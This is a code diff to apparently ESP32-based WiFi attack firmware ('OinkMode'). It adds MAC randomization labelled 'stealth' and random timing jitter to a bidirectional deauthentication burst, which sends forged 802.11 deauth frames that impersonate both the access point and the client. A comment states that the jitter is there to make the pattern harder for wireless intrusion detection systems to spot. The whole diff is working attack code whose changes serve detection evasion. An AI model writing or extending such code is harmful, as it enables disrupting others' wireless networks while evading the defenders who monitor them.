@@ -189,6 +189,12 @@ void OinkMode::start() {
     
     // Initialize WiFi in promiscuous mode
     WiFi.mode(WIFI_STA);
+    
+    // Randomize MAC if enabled (stealth)
+    if (Config::wifi().randomizeMAC) {
+        WSLBypasser::randomizeMAC();
+    }
+    
     WiFi.disconnect();
     delay(100);  // Give WiFi time to settle
     
@@ -1478,11 +1484,15 @@ void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uin
 
 void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
     // Send burst of deauth frames for more effective disconnection
+    // Random jitter between frames makes it harder for WIDS to detect pattern
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     
     for (uint8_t i = 0; i < count; i++) {
         // AP -> Client (pretend to be AP)
         sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
+        
+        // Random jitter 1-5ms between forward and reverse frames
+        delay(random(1, 6));
         
         // Client -> AP (pretend to be client) - bidirectional attack
         if (memcmp(station, broadcast, 6) != 0) {
@@ -1499,6 +1509,11 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
             reversePacket[24] = 1;  // Unspecified reason
             reversePacket[25] = 0x00;
             esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
+            
+            // Jitter between iterations
+            if (i < count - 1) {
+                delay(random(1, 6));
+            }
         }
     }
 }
